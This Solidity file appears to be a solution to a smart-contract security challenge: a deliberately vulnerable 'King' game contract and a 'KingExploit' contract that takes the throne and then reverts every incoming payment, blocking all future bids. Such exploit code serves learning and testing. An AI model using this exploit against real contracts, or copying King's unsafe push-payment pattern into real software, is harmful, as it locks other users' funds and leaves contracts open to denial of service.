// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}

contract KingExploit {
    constructor() payable {}

    function sendFunds(address receiver, uint256 amount) external {
        require(amount <= address(this).balance, "insufficient balance");
        (bool success, ) = payable(receiver).call{value: amount}("");
        require(success, "payment failed");
    }

    receive() external payable {
        revert("transfer error");
    }
}
